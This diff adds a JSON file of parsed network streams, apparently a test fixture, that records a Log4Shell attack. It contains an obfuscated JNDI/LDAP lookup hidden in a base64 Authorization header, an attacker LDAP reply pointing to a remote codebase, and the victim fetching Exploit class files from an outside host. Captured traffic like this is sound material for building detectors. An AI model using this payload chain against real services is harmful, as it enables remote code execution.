@@ -1,0 +1,830 @@
+{
+  "streams": [
+    {
+      "stream_key": "172.17.0.1:50172-172.17.0.3:8000-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "http_request.uri",
+          "payload": "/test"
+        },
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://172.17.0.3:8000/test"
+        },
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "http_header.host",
+          "payload": "172.17.0.3:8000"
+        },
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "http_header.user_agent",
+          "payload": "python-requests/2.25.1"
+        },
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "http_header.authorization",
+          "payload": "Basic bG9nNHNoZWxsOiR7JHs6Oi1qfW5kaTpsZGFwOi8vMzQuOTEuNzMuMzc6MTM4OS9CYXNpYy9Db21tYW5kL0Jhc2U2NC9jR2x1WnlBdFl5QXhNQ0F4TGpFdU1TNHh9"
+        },
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "http_header.request_line",
+          "payload": "Host: 172.17.0.3:8000\r\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "http_header.request_line",
+          "payload": "User-Agent: python-requests/2.25.1\r\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept-Encoding: gzip, deflate\r\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept: */*\r\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "http_header.request_line",
+          "payload": "Connection: keep-alive\r\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "http_header.request_line",
+          "payload": "Authorization: Basic bG9nNHNoZWxsOiR7JHs6Oi1qfW5kaTpsZGFwOi8vMzQuOTEuNzMuMzc6MTM4OS9CYXNpYy9Db21tYW5kL0Jhc2U2NC9jR2x1WnlBdFl5QXhNQ0F4TGpFdU1TNHh9\r\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "http_field.text[0]",
+          "payload": "GET /test HTTP/1.1\\r\\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000107,
+          "timestamp_utc": "2021-12-22T15:46:03.293713000Z",
+          "position": "tcp_payload.text",
+          "payload": "GET /test HTTP/1.1\r\nHost: 172.17.0.3:8000\r\nUser-Agent: python-requests/2.25.1\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nAuthorization: Basic bG9nNHNoZWxsOiR7JHs6Oi1qfW5kaTpsZGFwOi8vMzQuOTEuNzMuMzc6MTM4OS9CYXNpYy9Db21tYW5kL0Jhc2U2NC9jR2x1WnlBdFl5QXhNQ0F4TGpFdU1TNHh9\r\n\r\n"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.3:54590-34.91.73.37:1389-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 13,
+          "time": 0.01434,
+          "timestamp_utc": "2021-12-22T15:46:03.307946000Z",
+          "position": "tcp_payload.text",
+          "payload": "0o\u0002\u0001\u0002cM\u0004-Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x\n\u0001\u0000\n\u0001\u0003\u0002\u0001\u0000\u0002\u0001\u0000\u0001\u0001\u0000�\u000bobjectClass0\u0000�\u001b0\u0019\u0004\u00172.16.840.1.113730.3.4.2"
+        },
+        {
+          "no": 28,
+          "time": 0.030208,
+          "timestamp_utc": "2021-12-22T15:46:03.323814000Z",
+          "position": "tcp_payload.text",
+          "payload": "0\"\u0002\u0001\u0003B\u0000�\u001b0\u0019\u0004\u00172.16.840.1.113730.3.4.2"
+        }
+      ]
+    },
+    {
+      "stream_key": "34.91.73.37:1389-172.17.0.3:54590-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 15,
+          "time": 0.02277,
+          "timestamp_utc": "2021-12-22T15:46:03.316376000Z",
+          "position": "tcp_payload.text",
+          "payload": "0��\u0002\u0001\u0002d��\u0004-Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x0��0\u0016\u0004\rjavaClassName1\u0005\u0004\u0003foo0(\u0004\fjavaCodeBase1\u0018\u0004\u0016http://34.91.73.37:80/0$\u0004\u000bobjectClass1\u0015\u0004\u0013javaNamingReference0\"\u0004\u000bjavaFactory1\u0013\u0004\u0011ExploitN3Mwwy59tU"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.3:42082-34.91.73.37:80-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 22,
+          "time": 0.024512,
+          "timestamp_utc": "2021-12-22T15:46:03.318118000Z",
+          "position": "http_request.uri",
+          "payload": "/ExploitN3Mwwy59tU.class"
+        },
+        {
+          "no": 22,
+          "time": 0.024512,
+          "timestamp_utc": "2021-12-22T15:46:03.318118000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://34.91.73.37/ExploitN3Mwwy59tU.class"
+        },
+        {
+          "no": 22,
+          "time": 0.024512,
+          "timestamp_utc": "2021-12-22T15:46:03.318118000Z",
+          "position": "http_header.host",
+          "payload": "34.91.73.37"
+        },
+        {
+          "no": 22,
+          "time": 0.024512,
+          "timestamp_utc": "2021-12-22T15:46:03.318118000Z",
+          "position": "http_header.user_agent",
+          "payload": "Java/1.8.0_181"
+        },
+        {
+          "no": 22,
+          "time": 0.024512,
+          "timestamp_utc": "2021-12-22T15:46:03.318118000Z",
+          "position": "http_header.request_line",
+          "payload": "User-Agent: Java/1.8.0_181\r\n"
+        },
+        {
+          "no": 22,
+          "time": 0.024512,
+          "timestamp_utc": "2021-12-22T15:46:03.318118000Z",
+          "position": "http_header.request_line",
+          "payload": "Host: 34.91.73.37\r\n"
+        },
+        {
+          "no": 22,
+          "time": 0.024512,
+          "timestamp_utc": "2021-12-22T15:46:03.318118000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n"
+        },
+        {
+          "no": 22,
+          "time": 0.024512,
+          "timestamp_utc": "2021-12-22T15:46:03.318118000Z",
+          "position": "http_header.request_line",
+          "payload": "Connection: keep-alive\r\n"
+        },
+        {
+          "no": 22,
+          "time": 0.024512,
+          "timestamp_utc": "2021-12-22T15:46:03.318118000Z",
+          "position": "http_field.text[0]",
+          "payload": "GET /ExploitN3Mwwy59tU.class HTTP/1.1\\r\\n"
+        },
+        {
+          "no": 22,
+          "time": 0.024512,
+          "timestamp_utc": "2021-12-22T15:46:03.318118000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 22,
+          "time": 0.024512,
+          "timestamp_utc": "2021-12-22T15:46:03.318118000Z",
+          "position": "tcp_payload.text",
+          "payload": "GET /ExploitN3Mwwy59tU.class HTTP/1.1\r\nUser-Agent: Java/1.8.0_181\r\nHost: 34.91.73.37\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nConnection: keep-alive\r\n\r\n"
+        },
+        {
+          "no": 48,
+          "time": 0.039895,
+          "timestamp_utc": "2021-12-22T15:46:03.333501000Z",
+          "position": "http_request.uri",
+          "payload": "/ExploitK7WmXivdc5.class"
+        },
+        {
+          "no": 48,
+          "time": 0.039895,
+          "timestamp_utc": "2021-12-22T15:46:03.333501000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://34.91.73.37/ExploitK7WmXivdc5.class"
+        },
+        {
+          "no": 48,
+          "time": 0.039895,
+          "timestamp_utc": "2021-12-22T15:46:03.333501000Z",
+          "position": "http_header.host",
+          "payload": "34.91.73.37"
+        },
+        {
+          "no": 48,
+          "time": 0.039895,
+          "timestamp_utc": "2021-12-22T15:46:03.333501000Z",
+          "position": "http_header.user_agent",
+          "payload": "Java/1.8.0_181"
+        },
+        {
+          "no": 48,
+          "time": 0.039895,
+          "timestamp_utc": "2021-12-22T15:46:03.333501000Z",
+          "position": "http_header.request_line",
+          "payload": "User-Agent: Java/1.8.0_181\r\n"
+        },
+        {
+          "no": 48,
+          "time": 0.039895,
+          "timestamp_utc": "2021-12-22T15:46:03.333501000Z",
+          "position": "http_header.request_line",
+          "payload": "Host: 34.91.73.37\r\n"
+        },
+        {
+          "no": 48,
+          "time": 0.039895,
+          "timestamp_utc": "2021-12-22T15:46:03.333501000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n"
+        },
+        {
+          "no": 48,
+          "time": 0.039895,
+          "timestamp_utc": "2021-12-22T15:46:03.333501000Z",
+          "position": "http_header.request_line",
+          "payload": "Connection: keep-alive\r\n"
+        },
+        {
+          "no": 48,
+          "time": 0.039895,
+          "timestamp_utc": "2021-12-22T15:46:03.333501000Z",
+          "position": "http_field.text[0]",
+          "payload": "GET /ExploitK7WmXivdc5.class HTTP/1.1\\r\\n"
+        },
+        {
+          "no": 48,
+          "time": 0.039895,
+          "timestamp_utc": "2021-12-22T15:46:03.333501000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 48,
+          "time": 0.039895,
+          "timestamp_utc": "2021-12-22T15:46:03.333501000Z",
+          "position": "tcp_payload.text",
+          "payload": "GET /ExploitK7WmXivdc5.class HTTP/1.1\r\nUser-Agent: Java/1.8.0_181\r\nHost: 34.91.73.37\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nConnection: keep-alive\r\n\r\n"
+        },
+        {
+          "no": 74,
+          "time": 0.04975,
+          "timestamp_utc": "2021-12-22T15:46:03.343356000Z",
+          "position": "http_request.uri",
+          "payload": "/Exploitc2wqUk8rQn.class"
+        },
+        {
+          "no": 74,
+          "time": 0.04975,
+          "timestamp_utc": "2021-12-22T15:46:03.343356000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://34.91.73.37/Exploitc2wqUk8rQn.class"
+        },
+        {
+          "no": 74,
+          "time": 0.04975,
+          "timestamp_utc": "2021-12-22T15:46:03.343356000Z",
+          "position": "http_header.host",
+          "payload": "34.91.73.37"
+        },
+        {
+          "no": 74,
+          "time": 0.04975,
+          "timestamp_utc": "2021-12-22T15:46:03.343356000Z",
+          "position": "http_header.user_agent",
+          "payload": "Java/1.8.0_181"
+        },
+        {
+          "no": 74,
+          "time": 0.04975,
+          "timestamp_utc": "2021-12-22T15:46:03.343356000Z",
+          "position": "http_header.request_line",
+          "payload": "User-Agent: Java/1.8.0_181\r\n"
+        },
+        {
+          "no": 74,
+          "time": 0.04975,
+          "timestamp_utc": "2021-12-22T15:46:03.343356000Z",
+          "position": "http_header.request_line",
+          "payload": "Host: 34.91.73.37\r\n"
+        },
+        {
+          "no": 74,
+          "time": 0.04975,
+          "timestamp_utc": "2021-12-22T15:46:03.343356000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n"
+        },
+        {
+          "no": 74,
+          "time": 0.04975,
+          "timestamp_utc": "2021-12-22T15:46:03.343356000Z",
+          "position": "http_header.request_line",
+          "payload": "Connection: keep-alive\r\n"
+        },
+        {
+          "no": 74,
+          "time": 0.04975,
+          "timestamp_utc": "2021-12-22T15:46:03.343356000Z",
+          "position": "http_field.text[0]",
+          "payload": "GET /Exploitc2wqUk8rQn.class HTTP/1.1\\r\\n"
+        },
+        {
+          "no": 74,
+          "time": 0.04975,
+          "timestamp_utc": "2021-12-22T15:46:03.343356000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 74,
+          "time": 0.04975,
+          "timestamp_utc": "2021-12-22T15:46:03.343356000Z",
+          "position": "tcp_payload.text",
+          "payload": "GET /Exploitc2wqUk8rQn.class HTTP/1.1\r\nUser-Agent: Java/1.8.0_181\r\nHost: 34.91.73.37\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nConnection: keep-alive\r\n\r\n"
+        },
+        {
+          "no": 100,
+          "time": 0.063357,
+          "timestamp_utc": "2021-12-22T15:46:03.356963000Z",
+          "position": "http_request.uri",
+          "payload": "/ExploituXjdBi7yn8.class"
+        },
+        {
+          "no": 100,
+          "time": 0.063357,
+          "timestamp_utc": "2021-12-22T15:46:03.356963000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://34.91.73.37/ExploituXjdBi7yn8.class"
+        },
+        {
+          "no": 100,
+          "time": 0.063357,
+          "timestamp_utc": "2021-12-22T15:46:03.356963000Z",
+          "position": "http_header.host",
+          "payload": "34.91.73.37"
+        },
+        {
+          "no": 100,
+          "time": 0.063357,
+          "timestamp_utc": "2021-12-22T15:46:03.356963000Z",
+          "position": "http_header.user_agent",
+          "payload": "Java/1.8.0_181"
+        },
+        {
+          "no": 100,
+          "time": 0.063357,
+          "timestamp_utc": "2021-12-22T15:46:03.356963000Z",
+          "position": "http_header.request_line",
+          "payload": "User-Agent: Java/1.8.0_181\r\n"
+        },
+        {
+          "no": 100,
+          "time": 0.063357,
+          "timestamp_utc": "2021-12-22T15:46:03.356963000Z",
+          "position": "http_header.request_line",
+          "payload": "Host: 34.91.73.37\r\n"
+        },
+        {
+          "no": 100,
+          "time": 0.063357,
+          "timestamp_utc": "2021-12-22T15:46:03.356963000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n"
+        },
+        {
+          "no": 100,
+          "time": 0.063357,
+          "timestamp_utc": "2021-12-22T15:46:03.356963000Z",
+          "position": "http_header.request_line",
+          "payload": "Connection: keep-alive\r\n"
+        },
+        {
+          "no": 100,
+          "time": 0.063357,
+          "timestamp_utc": "2021-12-22T15:46:03.356963000Z",
+          "position": "http_field.text[0]",
+          "payload": "GET /ExploituXjdBi7yn8.class HTTP/1.1\\r\\n"
+        },
+        {
+          "no": 100,
+          "time": 0.063357,
+          "timestamp_utc": "2021-12-22T15:46:03.356963000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 100,
+          "time": 0.063357,
+          "timestamp_utc": "2021-12-22T15:46:03.356963000Z",
+          "position": "tcp_payload.text",
+          "payload": "GET /ExploituXjdBi7yn8.class HTTP/1.1\r\nUser-Agent: Java/1.8.0_181\r\nHost: 34.91.73.37\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nConnection: keep-alive\r\n\r\n"
+        }
+      ]
+    },
+    {
+      "stream_key": "34.91.73.37:80-172.17.0.3:42082-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 24,
+          "time": 0.028522,
+          "timestamp_utc": "2021-12-22T15:46:03.322128000Z",
+          "position": "tcp_payload.text",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Wed, 22 Dec 2021 15:46:03 GMT\r\nContent-length: 1217\r\n\r\n"
+        },
+        {
+          "no": 26,
+          "time": 0.028907,
+          "timestamp_utc": "2021-12-22T15:46:03.322513000Z",
+          "position": "http_request.uri",
+          "payload": "/ExploitN3Mwwy59tU.class"
+        },
+        {
+          "no": 26,
+          "time": 0.028907,
+          "timestamp_utc": "2021-12-22T15:46:03.322513000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://34.91.73.37/ExploitN3Mwwy59tU.class"
+        },
+        {
+          "no": 26,
+          "time": 0.028907,
+          "timestamp_utc": "2021-12-22T15:46:03.322513000Z",
+          "position": "http_field.text[0]",
+          "payload": "HTTP/1.1 200 OK\\r\\n"
+        },
+        {
+          "no": 26,
+          "time": 0.028907,
+          "timestamp_utc": "2021-12-22T15:46:03.322513000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 26,
+          "time": 0.028907,
+          "timestamp_utc": "2021-12-22T15:46:03.322513000Z",
+          "position": "http_header.response_line",
+          "payload": "Date: Wed, 22 Dec 2021 15:46:03 GMT\r\n"
+        },
+        {
+          "no": 26,
+          "time": 0.028907,
+          "timestamp_utc": "2021-12-22T15:46:03.322513000Z",
+          "position": "http_header.response_line",
+          "payload": "Content-length: 1217\r\n"
+        },
+        {
+          "no": 50,
+          "time": 0.041005,
+          "timestamp_utc": "2021-12-22T15:46:03.334611000Z",
+          "position": "tcp_payload.text",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Wed, 22 Dec 2021 15:46:03 GMT\r\nContent-length: 1217\r\n\r\n"
+        },
+        {
+          "no": 52,
+          "time": 0.041438,
+          "timestamp_utc": "2021-12-22T15:46:03.335044000Z",
+          "position": "http_request.uri",
+          "payload": "/ExploitK7WmXivdc5.class"
+        },
+        {
+          "no": 52,
+          "time": 0.041438,
+          "timestamp_utc": "2021-12-22T15:46:03.335044000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://34.91.73.37/ExploitK7WmXivdc5.class"
+        },
+        {
+          "no": 52,
+          "time": 0.041438,
+          "timestamp_utc": "2021-12-22T15:46:03.335044000Z",
+          "position": "http_field.text[0]",
+          "payload": "HTTP/1.1 200 OK\\r\\n"
+        },
+        {
+          "no": 52,
+          "time": 0.041438,
+          "timestamp_utc": "2021-12-22T15:46:03.335044000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 52,
+          "time": 0.041438,
+          "timestamp_utc": "2021-12-22T15:46:03.335044000Z",
+          "position": "http_header.response_line",
+          "payload": "Date: Wed, 22 Dec 2021 15:46:03 GMT\r\n"
+        },
+        {
+          "no": 52,
+          "time": 0.041438,
+          "timestamp_utc": "2021-12-22T15:46:03.335044000Z",
+          "position": "http_header.response_line",
+          "payload": "Content-length: 1217\r\n"
+        },
+        {
+          "no": 76,
+          "time": 0.050788,
+          "timestamp_utc": "2021-12-22T15:46:03.344394000Z",
+          "position": "tcp_payload.text",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Wed, 22 Dec 2021 15:46:03 GMT\r\nContent-length: 1217\r\n\r\n"
+        },
+        {
+          "no": 78,
+          "time": 0.051157,
+          "timestamp_utc": "2021-12-22T15:46:03.344763000Z",
+          "position": "http_request.uri",
+          "payload": "/Exploitc2wqUk8rQn.class"
+        },
+        {
+          "no": 78,
+          "time": 0.051157,
+          "timestamp_utc": "2021-12-22T15:46:03.344763000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://34.91.73.37/Exploitc2wqUk8rQn.class"
+        },
+        {
+          "no": 78,
+          "time": 0.051157,
+          "timestamp_utc": "2021-12-22T15:46:03.344763000Z",
+          "position": "http_field.text[0]",
+          "payload": "HTTP/1.1 200 OK\\r\\n"
+        },
+        {
+          "no": 78,
+          "time": 0.051157,
+          "timestamp_utc": "2021-12-22T15:46:03.344763000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 78,
+          "time": 0.051157,
+          "timestamp_utc": "2021-12-22T15:46:03.344763000Z",
+          "position": "http_header.response_line",
+          "payload": "Date: Wed, 22 Dec 2021 15:46:03 GMT\r\n"
+        },
+        {
+          "no": 78,
+          "time": 0.051157,
+          "timestamp_utc": "2021-12-22T15:46:03.344763000Z",
+          "position": "http_header.response_line",
+          "payload": "Content-length: 1217\r\n"
+        },
+        {
+          "no": 102,
+          "time": 0.064542,
+          "timestamp_utc": "2021-12-22T15:46:03.358148000Z",
+          "position": "tcp_payload.text",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Wed, 22 Dec 2021 15:46:03 GMT\r\nContent-length: 1217\r\n\r\n"
+        },
+        {
+          "no": 104,
+          "time": 0.065012,
+          "timestamp_utc": "2021-12-22T15:46:03.358618000Z",
+          "position": "http_request.uri",
+          "payload": "/ExploituXjdBi7yn8.class"
+        },
+        {
+          "no": 104,
+          "time": 0.065012,
+          "timestamp_utc": "2021-12-22T15:46:03.358618000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://34.91.73.37/ExploituXjdBi7yn8.class"
+        },
+        {
+          "no": 104,
+          "time": 0.065012,
+          "timestamp_utc": "2021-12-22T15:46:03.358618000Z",
+          "position": "http_field.text[0]",
+          "payload": "HTTP/1.1 200 OK\\r\\n"
+        },
+        {
+          "no": 104,
+          "time": 0.065012,
+          "timestamp_utc": "2021-12-22T15:46:03.358618000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 104,
+          "time": 0.065012,
+          "timestamp_utc": "2021-12-22T15:46:03.358618000Z",
+          "position": "http_header.response_line",
+          "payload": "Date: Wed, 22 Dec 2021 15:46:03 GMT\r\n"
+        },
+        {
+          "no": 104,
+          "time": 0.065012,
+          "timestamp_utc": "2021-12-22T15:46:03.358618000Z",
+          "position": "http_header.response_line",
+          "payload": "Content-length: 1217\r\n"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.3:54594-34.91.73.37:1389-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 42,
+          "time": 0.036673,
+          "timestamp_utc": "2021-12-22T15:46:03.330279000Z",
+          "position": "tcp_payload.text",
+          "payload": "0o\u0002\u0001\u0002cM\u0004-Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x\n\u0001\u0000\n\u0001\u0003\u0002\u0001\u0000\u0002\u0001\u0000\u0001\u0001\u0000�\u000bobjectClass0\u0000�\u001b0\u0019\u0004\u00172.16.840.1.113730.3.4.2"
+        },
+        {
+          "no": 54,
+          "time": 0.042429,
+          "timestamp_utc": "2021-12-22T15:46:03.336035000Z",
+          "position": "tcp_payload.text",
+          "payload": "0\"\u0002\u0001\u0003B\u0000�\u001b0\u0019\u0004\u00172.16.840.1.113730.3.4.2"
+        }
+      ]
+    },
+    {
+      "stream_key": "34.91.73.37:1389-172.17.0.3:54594-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 44,
+          "time": 0.039199,
+          "timestamp_utc": "2021-12-22T15:46:03.332805000Z",
+          "position": "tcp_payload.text",
+          "payload": "0��\u0002\u0001\u0002d��\u0004-Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x0��0\u0016\u0004\rjavaClassName1\u0005\u0004\u0003foo0(\u0004\fjavaCodeBase1\u0018\u0004\u0016http://34.91.73.37:80/0$\u0004\u000bobjectClass1\u0015\u0004\u0013javaNamingReference0\"\u0004\u000bjavaFactory1\u0013\u0004\u0011ExploitK7WmXivdc5"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.3:54596-34.91.73.37:1389-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 67,
+          "time": 0.047102,
+          "timestamp_utc": "2021-12-22T15:46:03.340708000Z",
+          "position": "tcp_payload.text",
+          "payload": "0o\u0002\u0001\u0002cM\u0004-Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x\n\u0001\u0000\n\u0001\u0003\u0002\u0001\u0000\u0002\u0001\u0000\u0001\u0001\u0000�\u000bobjectClass0\u0000�\u001b0\u0019\u0004\u00172.16.840.1.113730.3.4.2"
+        },
+        {
+          "no": 80,
+          "time": 0.052415,
+          "timestamp_utc": "2021-12-22T15:46:03.346021000Z",
+          "position": "tcp_payload.text",
+          "payload": "0\"\u0002\u0001\u0003B\u0000�\u001b0\u0019\u0004\u00172.16.840.1.113730.3.4.2"
+        }
+      ]
+    },
+    {
+      "stream_key": "34.91.73.37:1389-172.17.0.3:54596-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 70,
+          "time": 0.048804,
+          "timestamp_utc": "2021-12-22T15:46:03.342410000Z",
+          "position": "tcp_payload.text",
+          "payload": "0��\u0002\u0001\u0002d��\u0004-Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x0��0\u0016\u0004\rjavaClassName1\u0005\u0004\u0003foo0(\u0004\fjavaCodeBase1\u0018\u0004\u0016http://34.91.73.37:80/0$\u0004\u000bobjectClass1\u0015\u0004\u0013javaNamingReference0\"\u0004\u000bjavaFactory1\u0013\u0004\u0011Exploitc2wqUk8rQn"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.3:54598-34.91.73.37:1389-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 94,
+          "time": 0.060169,
+          "timestamp_utc": "2021-12-22T15:46:03.353775000Z",
+          "position": "tcp_payload.text",
+          "payload": "0o\u0002\u0001\u0002cM\u0004-Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x\n\u0001\u0000\n\u0001\u0003\u0002\u0001\u0000\u0002\u0001\u0000\u0001\u0001\u0000�\u000bobjectClass0\u0000�\u001b0\u0019\u0004\u00172.16.840.1.113730.3.4.2"
+        },
+        {
+          "no": 106,
+          "time": 0.066042,
+          "timestamp_utc": "2021-12-22T15:46:03.359648000Z",
+          "position": "tcp_payload.text",
+          "payload": "0\"\u0002\u0001\u0003B\u0000�\u001b0\u0019\u0004\u00172.16.840.1.113730.3.4.2"
+        }
+      ]
+    },
+    {
+      "stream_key": "34.91.73.37:1389-172.17.0.3:54598-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 96,
+          "time": 0.062659,
+          "timestamp_utc": "2021-12-22T15:46:03.356265000Z",
+          "position": "tcp_payload.text",
+          "payload": "0��\u0002\u0001\u0002d��\u0004-Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x0��0\u0016\u0004\rjavaClassName1\u0005\u0004\u0003foo0(\u0004\fjavaCodeBase1\u0018\u0004\u0016http://34.91.73.37:80/0$\u0004\u000bobjectClass1\u0015\u0004\u0013javaNamingReference0\"\u0004\u000bjavaFactory1\u0013\u0004\u0011ExploituXjdBi7yn8"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.3:8000-172.17.0.1:50172-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 112,
+          "time": 0.068868,
+          "timestamp_utc": "2021-12-22T15:46:03.362474000Z",
+          "position": "tcp_payload.text",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Wed, 22 Dec 2021 15:46:03 GMT\r\nContent-length: 20\r\n\r\n"
+        },
+        {
+          "no": 114,
+          "time": 0.068942,
+          "timestamp_utc": "2021-12-22T15:46:03.362548000Z",
+          "position": "http_request.uri",
+          "payload": "/test"
+        },
+        {
+          "no": 114,
+          "time": 0.068942,
+          "timestamp_utc": "2021-12-22T15:46:03.362548000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://172.17.0.3:8000/test"
+        },
+        {
+          "no": 114,
+          "time": 0.068942,
+          "timestamp_utc": "2021-12-22T15:46:03.362548000Z",
+          "position": "http_field.text[0]",
+          "payload": "HTTP/1.1 200 OK\\r\\n"
+        },
+        {
+          "no": 114,
+          "time": 0.068942,
+          "timestamp_utc": "2021-12-22T15:46:03.362548000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 114,
+          "time": 0.068942,
+          "timestamp_utc": "2021-12-22T15:46:03.362548000Z",
+          "position": "http_header.response_line",
+          "payload": "Date: Wed, 22 Dec 2021 15:46:03 GMT\r\n"
+        },
+        {
+          "no": 114,
+          "time": 0.068942,
+          "timestamp_utc": "2021-12-22T15:46:03.362548000Z",
+          "position": "http_header.response_line",
+          "payload": "Content-length: 20\r\n"
+        },
+        {
+          "no": 114,
+          "time": 0.068942,
+          "timestamp_utc": "2021-12-22T15:46:03.362548000Z",
+          "position": "tcp_payload.text",
+          "payload": "This is the response"
+        }
+      ]
+    }
+  ]
+}
